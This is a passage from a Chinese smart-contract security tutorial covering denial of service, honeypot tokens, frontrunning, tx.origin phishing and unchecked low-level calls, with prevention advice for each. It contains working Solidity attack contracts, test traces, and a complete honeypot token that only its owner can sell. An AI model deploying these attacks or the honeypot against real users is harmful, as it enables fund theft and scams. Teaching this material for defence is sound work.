href="https://eips.ethereum.org/EIPS/eip-3074">eip-3074</a>中，这样检查合约的方式，会失效。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function realContract(address account) public view returns (bool) &#123;<br>    return (tx.origin == msg.sender);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h2><p>这一讲，我们介绍了合约长度检查可以被绕过的漏洞，并介绍预防的方法。如果一个地址的 <code>extcodesize &gt; 0</code>，则该地址一定为合约；但如果 <code>extcodesize = 0</code>，该地址既可能为 <code>EOA</code>，也可能为正在创建状态的合约。</p><h1 id="S09-拒绝服务"><a href="#S09-拒绝服务" class="headerlink" title="S09. 拒绝服务"></a>S09. 拒绝服务</h1><p>在 Web2 中，拒绝服务攻击（DoS）是指通过向服务器发送大量垃圾信息或干扰信息的方式，导致服务器无法向正常用户提供服务的现象。而在 Web3，它指的是利用漏洞使得智能合约无法正常提供服务。</p><p>在 2022 年 4 月，一个很火的 NFT 项目名为 Akutar，他们使用<a href="https://github.com/AmazingAng/WTF-Solidity/tree/main/35_DutchAuction">荷兰拍卖</a>进行公开发行，筹集了 11,539.5 ETH，非常成功。之前持有他们社区 Pass 的参与者会得到 0.5 ETH 的退款，但是他们处理退款的时候，发现智能合约不能正常运行，全部资金被永远锁在了合约里。他们的智能合约有拒绝服务漏洞。</p><p><img src="/img/web3/S09-1.png" alt="S09-1"></p><h2 id="漏洞例子-1"><a href="#漏洞例子-1" class="headerlink" title="漏洞例子"></a>漏洞例子</h2><p>下面我们学习一个简化了的 Akutar 合约，名字叫 <code>DoSGame</code>。这个合约逻辑很简单，游戏开始时，玩家们调用 <code>deposit()</code> 函数往合约里存款，合约会记录下所有玩家地址和相应的存款；当游戏结束时，<code>refund()</code>函数被调用，将 ETH 依次退款给所有玩家。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.8.21;<br><br>// 有DoS漏洞的游戏，玩家们先存钱，游戏结束后，调用refund退钱。<br>contract DoSGame &#123;<br>    bool public refundFinished;<br>    mapping(address =&gt; uint256) public balanceOf;<br>    address[] public players;<br><br>    // 所有玩家存ETH到合约里<br>    function deposit() external payable &#123;<br>        require(!refundFinished, &quot;Game Over&quot;);<br>        require(msg.value &gt; 0, &quot;Please donate ETH&quot;);<br>        // 记录存款<br>        balanceOf[msg.sender] = msg.value;<br>        // 记录玩家地址<br>        players.push(msg.sender);<br>    &#125;<br><br>    // 游戏结束，退款开始，所有玩家将依次收到退款<br>    function refund() external &#123;<br>        require(!refundFinished, &quot;Game Over&quot;);<br>        uint256 pLength = players.length;<br>        // 通过循环给所有玩家退款<br>        for(uint256 i; i &lt; pLength; i++)&#123;<br>            address player = players[i];<br>            uint256 refundETH = balanceOf[player];<br>            (bool success, ) = player.call&#123;value: refundETH&#125;(&quot;&quot;);<br>            require(success, &quot;Refund Fail!&quot;);<br>            balanceOf[player] = 0;<br>        &#125;<br>        refundFinished = true;<br>    &#125;<br><br>    function balance() external view returns(uint256)&#123;<br>        return address(this).balance;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里的漏洞在于，<code>refund()</code> 函数中利用循环退款的时候，是使用的 <code>call</code> 函数，将激活目标地址的回调函数，如果目标地址为一个恶意合约，在回调函数中加入了恶意逻辑，退款将不能正常进行。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs solidity">(bool success, ) = player.call&#123;value: refundETH&#125;(&quot;&quot;);<br></code></pre></td></tr></table></figure><p>下面我们写个攻击合约， <code>attack()</code> 函数中将调用 <code>DoSGame</code> 合约的 <code>deposit()</code> 存款并参与游戏；<code>fallback()</code> 回调函数将回退所有向该合约发送<code>ETH</code>的交易，对<code>DoSGame</code> 合约中的 DoS 漏洞进行了攻击，所有退款将不能正常进行，资金被锁在合约中，就像 Akutar 合约中的一万多枚 ETH 一样。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract Attack &#123;<br>    // 退款时进行DoS攻击<br>    fallback() external payable&#123;<br>        revert(&quot;DoS Attack!&quot;);<br>    &#125;<br><br>    // 参与DoS游戏并存款<br>    function attack(address gameAddr) external payable &#123;<br>        DoSGame dos = DoSGame(gameAddr);<br>        dos.deposit&#123;value: msg.value&#125;();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>测试场景一：正常使用是否可以成功退款</p><p>测试代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract DoSGameAttackTest is Test &#123;<br>    DoSGame public doSGame;<br>    DoSGameAttack public doSGameAttack;<br>    address public user;<br>    function setUp() public &#123;<br>        doSGame = new DoSGame(); // 部署 DoSGame 合约<br>        // 创建测试用户<br>        user = makeAddr(&quot;testUser&quot;);<br>        // 给用户转账<br>        vm.deal(user, 10 * 1e18);<br>    &#125;<br>    function test_deposit() public &#123;<br>        vm.startPrank(user);<br>        uint256 Before = doSGame.balance();<br>        console.log(&quot;doSGame.balance Before is  &quot;, Before);<br>        doSGame.deposit&#123;value: 3 * 1e18&#125;();// 往 bank充值3颗ETH<br>        uint256 After = doSGame.balance();<br>        console.log(&quot;doSGame.balance After is  &quot;, After);<br>        doSGame.refund(); // 成功退款<br>        uint256 End = doSGame.balance();<br>        console.log(&quot;doSGame.balance End is  &quot;, End);<br>        vm.stopPrank();<br>    &#125;&#125;<br></code></pre></td></tr></table></figure><p>正常场景的测试结果</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs shell">Logs:<br>  doSGame.balance Before is   0<br>  doSGame.balance After is   3000000000000000000<br>  doSGame.balance End is   0<br><br>Traces:<br>  [123843] DoSGameAttackTest::test_deposit()<br>    ├─ [0] VM::startPrank(testUser: [0xF7DFAA7B4230fdc795e8C6430834Cf309aF893bA])<br>    │   └─ ← [Return]<br>    ├─ [378] DoSGame::balance() [staticcall]<br>    │   └─ ← [Return] 0<br>    ├─ [0] console::log(&quot;doSGame.balance Before is  &quot;, 0) [staticcall]<br>    │   └─ ← [Stop]<br>    ├─ [68935] DoSGame::deposit&#123;value: 3000000000000000000&#125;()<br>    │   └─ ← [Stop]<br>    ├─ [378] DoSGame::balance() [staticcall]<br>    │   └─ ← [Return] 3000000000000000000 [3e18]<br>    ├─ [0] console::log(&quot;doSGame.balance After is  &quot;, 3000000000000000000 [3e18]) [staticcall]<br>    │   └─ ← [Stop]<br>    ├─ [28477] DoSGame::refund()<br>    │   ├─ [0] testUser::fallback&#123;value: 3000000000000000000&#125;()<br>    │   │   └─ ← [Stop]<br>    │   └─ ← [Stop]<br>    ├─ [378] DoSGame::balance() [staticcall]<br>    │   └─ ← [Return] 0<br>    ├─ [0] console::log(&quot;doSGame.balance End is  &quot;, 0) [staticcall]<br>    │   └─ ← [Stop]<br>    ├─ [0] VM::stopPrank()<br>    │   └─ ← [Return]<br>    └─ ← [Stop]<br><br></code></pre></td></tr></table></figure><p>测试场景二：攻击合约测试</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function test_DoSGameAttack() public &#123;<br>    vm.startPrank(user);<br>    uint256 Before = doSGame.balance();<br>    console.log(&quot;doSGame.balance Before is  &quot;, Before);<br>    doSGameAttack = new DoSGameAttack(); //实例化攻击合约<br>    doSGameAttack.attack&#123;value: 3 * 1e18&#125;(address(doSGame));<br>    doSGame.refund();<br>    uint256 After = doSGame.balance();<br>    console.log(&quot;doSGame.balance After is  &quot;, After);<br>    vm.stopPrank();<br>&#125;<br></code></pre></td></tr></table></figure><p>运行结果：无法赎回，为什么呢？因为在攻击合约里面定义了fallback回调函数，里面抛出了一个revert导致回调失败，无法赎回</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs shell">[268726] DoSGameAttackTest::test_DoSGameAttack()<br>  ├─ [0] VM::startPrank(testUser: [0xF7DFAA7B4230fdc795e8C6430834Cf309aF893bA])<br>  │   └─ ← [Return]<br>  ├─ [378] DoSGame::balance() [staticcall]<br>  │   └─ ← [Return] 0<br>  ├─ [0] console::log(&quot;doSGame.balance Before is  &quot;, 0) [staticcall]<br>  │   └─ ← [Stop]<br>  ├─ [106751] → new DoSGameAttack@0xb8BE0Cc57897f40C22410548f33B2750cb01E14f<br>  │   └─ ← [Return] 533 bytes of code<br>  ├─ [76392] DoSGameAttack::attack&#123;value: 3000000000000000000&#125;(DoSGame: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f])<br>  │   ├─ [68935] DoSGame::deposit&#123;value: 3000000000000000000&#125;()<br>  │   │   └─ ← [Stop]<br>  │   └─ ← [Stop]<br>  ├─ [8756] DoSGame::refund()<br>  │   ├─ [335] DoSGameAttack::fallback&#123;value: 3000000000000000000&#125;()<br>  │   │   └─ ← [Revert] DoS Attack!<br>  │   └─ ← [Revert] Refund Fail!<br>  └─ ← [Revert] Refund Fail!<br></code></pre></td></tr></table></figure><h2 id="预防方法"><a href="#预防方法" class="headerlink" title="预防方法"></a>预防方法</h2><p>很多逻辑错误都可能导致智能合约拒绝服务，所以开发者在写智能合约时要万分谨慎。以下是一些需要特别注意的地方：</p><ol><li>外部合约的函数调用（例如 <code>call</code>）失败时不会使得重要功能卡死，比如将上面漏洞合约中的 <code>require(success, &quot;Refund Fail!&quot;);</code> 去掉，退款在单个地址失败时仍能继续运行。</li><li>合约不会出乎意料的自毁。</li><li>合约不会进入无限循环。</li><li><code>require</code> 和 <code>assert</code> 的参数设定正确。</li><li>退款时，让用户从合约自行领取（pull），而非批量发送给用户(push)。</li><li>确保回调函数不会影响正常合约运行。</li><li>确保当合约的参与者（例如 <code>owner</code>）永远缺席时，合约的主要业务仍能顺利运行。</li></ol><h1 id="S10-貔貅"><a href="#S10-貔貅" class="headerlink" title="S10. 貔貅"></a>S10. 貔貅</h1><p><a href="https://en.wikipedia.org/wiki/Pixiu">貔貅</a>是中国的一个神兽，因为在天庭犯了戒，被玉帝揍的肛门封闭了，只能吃不能拉，可以帮人们聚财。但在Web3中，貔貅变为了不详之兽，韭菜的天敌。貔貅盘的特点：投资人只能买不能卖，仅有项目方地址能卖出。（英文习惯叫蜜罐代币 honeypot token）。</p><p>通常一个貔貅盘有如下的生命周期：</p><ol><li>恶意项目方部署貔貅代币合约。</li><li>宣传貔貅代币让散户上车，由于只能买不能卖，代币价格会一路走高。</li><li>项目方<code>rug pull</code>卷走资金</li></ol><p>介绍一个极简的ERC20代币貔貅合约<code>Pixiu</code>。在该合约中，只有合约拥有者可以在<code>uniswap</code>出售代币，其他地址不能。</p><p><code>Pixiu</code> 有一个状态变量<code>pair</code>，用于记录<code>uniswap</code>中 <code>Pixiu-ETH LP</code>的币对地址。它主要有三个函数：</p><ol><li>构造函数：初始化代币的名称和代号，并根据 <code>uniswap</code> 和 <code>create2</code> 的原理计算<code>LP</code>合约地址，具体内容可以参考 <a href="https://github.com/AmazingAng/WTF-Solidity/blob/main/25_Create2/readme.md">WTF Solidity 第25讲: Create2</a>。这个地址会在 <code>_update()</code> 函数中用到。</li><li><code>mint()</code>：铸造函数，仅 <code>owner</code> 地址可以调用，用于铸造 <code>Pixiu</code> 代币。</li><li><code>_update()</code>：<code>ERC20</code>代币在被转账前会调用的函数。在其中，我们限制了当转账的目标地址 <code>to</code> 为 <code>LP</code> 的时候，也就是韭菜卖出的时候，交易会 <code>revert</code>；只有调用者为<code>owner</code>的时候能够成功。这也是貔貅合约的核心。</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// 极简貔貅ERC20代币，只能买，不能卖<br>contract HoneyPot is ERC20, Ownable &#123;<br>    address public pair;<br><br>    // 构造函数：初始化代币名称和代号<br>    constructor() ERC20(&quot;HoneyPot&quot;, &quot;Pi Xiu&quot;) &#123;<br>        address factory = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f; // goerli uniswap v2 factory<br>        address tokenA = address(this); // 貔貅代币地址<br>        address tokenB = 0xB4FBF271143F4FBf7B91A5ded31805e42b2208d6; //  goerli WETH<br>        (address token0, address token1) = tokenA &lt; tokenB ? (tokenA, tokenB) : (tokenB, tokenA); //将tokenA和tokenB按大小排序<br>        bytes32 salt = keccak256(abi.encodePacked(token0, token1));<br>        // calculate pair address<br>        pair = address(uint160(uint(keccak256(abi.encodePacked(<br>        hex&#x27;ff&#x27;,<br>        factory,<br>        salt,<br>        hex&#x27;96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f&#x27;<br>        )))));<br>    &#125;<br>    <br>    /**<br>     * 铸造函数，只有合约所有者可以调用<br>     */<br>    function mint(address to, uint amount) public onlyOwner &#123;<br>        _mint(to, amount);<br>    &#125;<br><br>    /**<br>     * @dev See &#123;ERC20-_update&#125;.<br>     * 貔貅函数：只有合约拥有者可以卖出<br>    */<br>    function _update(<br>      address from,<br>      address to,<br>      uint256 amount<br>  ) internal virtual override &#123;<br>     if(to == pair)&#123;<br>        require(from == owner(), &quot;Can not Transfer&quot;);<br>      &#125;<br>      super._update(from, to, amount);<br>  &#125;<br>  // 为什么是_update？<br>  // 注意override是重写，重写了父合约ERC20的_update<br>  // 而父合约ERC20的_update方法，就是更新所有人，就是转移，本来属于你的1个币转移给另一个人了，这就是update<br>  // 这里重写_update 当转移的to地址是pair地址时，触发校验，要求from必须是 owner，<br>  // 也就是说只有owner才可以向pair合约转账<br>  // 也就代表自由owner才可以向uniswap卖币<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="S11-抢先交易"><a href="#S11-抢先交易" class="headerlink" title="S11. 抢先交易"></a>S11. 抢先交易</h1><h3 id="链上抢跑"><a href="#链上抢跑" class="headerlink" title="链上抢跑"></a>链上抢跑</h3><p>链上抢跑指的是搜索者或矿工通过调高<code>gas</code>或其他方法将自己的交易安插在其他交易之前，来攫取价值。在区块链中，矿工可以通过打包、排除或重新排序他们产生的区块中的交易来获得一定的利润，而<code>MEV</code>是衡量这种利润的指标。</p><p>在用户的交易被矿工打包进以太坊区块链之前，大部分交易会汇集到Mempool（交易内存池）中，矿工在这里寻找费用高的交易优先打包出块，实现利益最大化。通常来说，gas price越高的交易，越容易被打包。同时，一些<code>MEV</code>机器人也会搜索<code>mempool</code>中有利可图的交易。比如，一笔在去中心化交易所中滑点设置过高的<code>swap</code>交易可能会被三明治攻击：通过调整gas，套利者会在这笔交易之前插一个买单，再在之后发送一个卖单，并从中盈利。这等效于哄抬市价。</p><p><img src="/img/web3/S11-1.png" alt="S11-1"></p><h2 id="抢跑实践"><a href="#抢跑实践" class="headerlink" title="抢跑实践"></a>抢跑实践</h2><p>如果你学会了抢跑，你就算是入门的币圈科学家了。接下来，让我们实践一下，抢跑一笔铸造NFT的交易。我们将会用到的工具：</p><ul><li><code>Foundry</code>的<code>anvil</code>工具搭建本地测试链，请提前安装好 <a href="https://book.getfoundry.sh/getting-started/installation">foundry</a>。</li><li><code>remix</code>进行NFT合约的部署和铸造</li><li><code>etherjs</code>脚本监听<code>mempool</code>并进行抢跑。</li></ul><p><strong>1. 启动Foundry本地测试链：</strong> 在安装好 <code>foundry</code> 之后，在命令行输入 <code>anvil --chain-id 1234 -b 10</code> 搭建本地测试链，chain-id 为 1234，每 10 秒产出一个区块。搭建成功后，它会在显示一些测试账户的地址和私钥，每个账户有 10000 ETH。你可以使用它们进行测试。</p><p><strong>2. 将Remix连接到测试链：</strong> 打开 Remix 的部署页面，打开左上角的<code>Environment</code>下拉菜单，选<code>Foundry Provider</code>即可将 Remix 连接到测试链。</p><p><strong>3. 部署NFT合约：</strong> 在 Remix 上部署一个简单的 freemint（免费铸造）NFT合约。它有一个<code>mint()</code>，用于免费铸造NFT。</p><p><strong>4. 部署ethers.js抢跑脚本：</strong> 简单来说，<code>frontrun.js</code>脚本监听了测试链<code>mempool</code>中的未决交易，筛选出调用了<code>mint()</code>的交易，然后复制它并调高<code>gas</code>进行抢跑。</p><p><strong>5. 调用<code>mint()</code>函数：</strong> 在 Remix 的部署页面调用 Freemint 合约的<code>mint()</code> 函数，进行 NFT 铸造。</p><p><strong>6. 脚本监听到交易并进行抢跑</strong> 我们可以在终端看到 <code>frontrun.js</code> 脚本成功监听到了交易，并进行了抢跑。如果你调用 NFT 合约的 <code>ownerOf()</code> 函数查看 <code>tokenId</code> 为 0 的持有者是抢跑脚本中的钱包地址，证明抢跑成功！。</p><h2 id="预防方法-1"><a href="#预防方法-1" class="headerlink" title="预防方法"></a>预防方法</h2><p>抢先交易是以太坊等公链上普遍存在的问题。我们没法消除它，但是可以通过减少交易顺序或时间的重要性，减少被抢先交易的收益：</p><ul><li>使用预提交方案(commit-reveal scheme)。</li><li>使用暗池，用户发出的交易将不进入公开的<code>mempool</code>，而是直接到矿工手里。例如 flashbots 和 TaiChi。</li><li>在调用参数中加上保护性参数，如<a href="https://uniswapv3book.com/milestone_3/slippage-protection.html">滑点保护</a>，从而减少抢跑者的潜在收益。</li></ul><p>具体操作步骤可以看<a href="https://github.com/AmazingAng/WTF-Solidity/tree/main/S11_Frontrun">WTF Solidity 合约安全: S11. 抢先交易</a></p><h1 id="S12-tx-origin钓鱼攻击"><a href="#S12-tx-origin钓鱼攻击" class="headerlink" title="S12. tx.origin钓鱼攻击"></a>S12. tx.origin钓鱼攻击</h1><p>上初中的时候特别喜欢玩游戏，但是项目方为了防止未成年人沉迷，规定只有身份证号显示已满十八岁的玩家才不受防沉迷限制。这该怎么办呢？后来自己饿使用家长的身份证号进行年龄验证，并成功绕过了防沉迷系统。这个案例与<code>tx.origin</code>钓鱼攻击有着异曲同工之妙。</p><p>在<code>solidity</code>中，使用<code>tx.origin</code>可以获得启动交易的原始地址，它与<code>msg.sender</code>十分相似，下面我们用一个例子来区分它们之间不同的地方。</p><p>如果用户A调用了B合约，再通过B合约调用了C合约，那么在C合约看来，<code>msg.sender</code>就是B合约，而<code>tx.origin</code>就是用户A。如果你不了解<code>call</code>的机制，可以阅读<a href="https://github.com/AmazingAng/WTF-Solidity/blob/main/22_Call/readme.md">WTF Solidity极简教程第22讲：Call</a>。</p><p><img src="/img/web3/S12_1.jpg" alt="S12-1"></p><p>因此如果一个银行合约使用了<code>tx.origin</code>做身份认证，那么黑客就有可能先部署一个攻击合约，然后再诱导银行合约的拥有者调用，即使<code>msg.sender</code>是攻击合约地址，但<code>tx.origin</code>是银行合约拥有者地址，那么转账就有可能成功。</p><h2 id="漏洞合约例子-5"><a href="#漏洞合约例子-5" class="headerlink" title="漏洞合约例子"></a>漏洞合约例子</h2><h3 id="银行合约-1"><a href="#银行合约-1" class="headerlink" title="银行合约"></a>银行合约</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract Bank &#123;<br>    address public owner;//记录合约的拥有者<br><br>    //在创建合约时给 owner 变量赋值<br>    constructor() payable &#123;<br>        owner = msg.sender;<br>    &#125;<br><br>    function transfer(address payable _to, uint _amount) public &#123;<br>        //检查消息来源 ！！！ 可能owner会被诱导调用该函数，有钓鱼风险！<br>        require(tx.origin == owner, &quot;Not owner&quot;);<br>        //转账ETH<br>        (bool sent, ) = _to.call&#123;value: _amount&#125;(&quot;&quot;);<br>        require(sent, &quot;Failed to send Ether&quot;);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="攻击合约-1"><a href="#攻击合约-1" class="headerlink" title="攻击合约"></a>攻击合约</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract Attack &#123;<br>    // 受益者地址<br>    address payable public hacker;<br>    // Bank合约地址<br>    Bank bank;<br><br>    constructor(Bank _bank) &#123;<br>        //强制将address类型的_bank转换为Bank类型<br>        bank = Bank(_bank);<br>        //将受益者地址赋值为部署者地址<br>        hacker = payable(msg.sender);<br>    &#125;<br><br>    function attack() public &#123;<br>        //诱导bank合约的owner调用，于是bank合约内的余额就全部转移到黑客地址中<br>        bank.transfer(hacker, address(bank).balance);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="攻击复线"><a href="#攻击复线" class="headerlink" title="攻击复线"></a>攻击复线</h3><p><strong>1.</strong> 先将<code>value</code>设置为10ETH，再部署 <code>Bank</code> 合约，拥有者地址 <code>owner</code> 被初始化为部署合约地址。</p><p><strong>2.</strong> 切换到另一个钱包作为黑客钱包，填入要攻击的银行合约地址，再部署 <code>Attack</code> 合约，黑客地址 <code>hacker</code> 被初始化为部署合约地址</p><p><strong>3.</strong> 切换回<code>owner</code>地址，此时我们被诱导调用了<code>Attack</code>合约的<code>attack()</code>函数，可以看到<code>Bank</code>合约余额被掏空了，同时黑客地址多了10ETH</p><h2 id="预防办法-4"><a href="#预防办法-4" class="headerlink" title="预防办法"></a>预防办法</h2><h3 id="1-使用msg-sender代替tx-origin"><a href="#1-使用msg-sender代替tx-origin" class="headerlink" title="1.使用msg.sender代替tx.origin"></a>1.使用<code>msg.sender</code>代替<code>tx.origin</code></h3><p><code>msg.sender</code>能够获取直接调用当前合约的调用发送者地址，通过对<code>msg.sender</code>的检验，就可以避免整个调用过程中混入外部攻击合约对当前合约的调用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function transfer(address payable _to, uint256 _amount) public &#123;<br>  require(msg.sender == owner, &quot;Not owner&quot;);<br><br>  (bool sent, ) = _to.call&#123;value: _amount&#125;(&quot;&quot;);<br>  require(sent, &quot;Failed to send Ether&quot;);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="2-检验tx-origin-msg-sender"><a href="#2-检验tx-origin-msg-sender" class="headerlink" title="2.检验tx.origin == msg.sender"></a>2.检验<code>tx.origin == msg.sender</code></h3><p>如果一定要使用<code>tx.origin</code>，那么可以再检验<code>tx.origin</code>是否等于<code>msg.sender</code>，这样也可以避免整个调用过程中混入外部攻击合约对当前合约的调用。但是副作用是其他合约将不能调用这个函数。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function transfer(address payable _to, uint _amount) public &#123;<br>    require(tx.origin == owner, &quot;Not owner&quot;);<br>    require(tx.origin == msg.sender, &quot;can&#x27;t call by external contract&quot;);<br>    (bool sent, ) = _to.call&#123;value: _amount&#125;(&quot;&quot;);<br>    require(sent, &quot;Failed to send Ether&quot;);<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="S13-未检查的低级调用"><a href="#S13-未检查的低级调用" class="headerlink" title="S13. 未检查的低级调用"></a>S13. 未检查的低级调用</h1><p>失败的低级调用不会让交易回滚，如果合约中忘记对其返回值进行检查，往往会出现严重的问题。</p><p>以太坊的低级调用包括 <code>call()</code>，<code>delegatecall()</code>，<code>staticcall()</code>，和<code>send()</code>。这些函数与 Solidity 其他函数不同，当出现异常时，它并不会向上层传递，也不会导致交易完全回滚；它只会返回一个布尔值 <code>false</code> ，传递调用失败的信息。因此，如果未检查低级函数调用的返回值，则无论低级调用失败与否，上层函数的代码会继续运行。对于低级调用更多的内容，请阅读 <a href="https://github.com/AmazingAng/WTF-Solidity">WTF Solidity 极简教程第20-23讲</a>。</p><p>最容易出错的是<code>send()</code>：一些合约使用 <code>send()</code> 发送 <code>ETH</code>，但是 <code>send()</code> 限制 gas 要低于 2300，否则会失败。当目标地址的回调函数比较复杂时，花费的 gas 将高于 2300，从而导致 <code>send()</code> 失败。如果此时在上层函数没有检查返回值的话，交易继续执行，就会出现意想不到的问题。2016年，有一款叫 <code>King of Ether</code> 的链游，因为这个漏洞导致退款无法正常发送（<a href="https://www.kingoftheether.com/postmortem.html">验尸报告</a>）。</p><p><img src="/img/web3/S13-1.png" alt="S13-1"></p><h2 id="漏洞例子-2"><a href="#漏洞例子-2" class="headerlink" title="漏洞例子"></a>漏洞例子</h2><h3 id="银行合约-2"><a href="#银行合约-2" class="headerlink" title="银行合约"></a>银行合约</h3><p>这个合约是在<code>S01 重入攻击</code>教程中的银行合约基础上修改而成。它包含<code>1</code>个状态变量<code>balanceOf</code>记录所有用户的以太坊余额；并且包含<code>3</code>个函数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 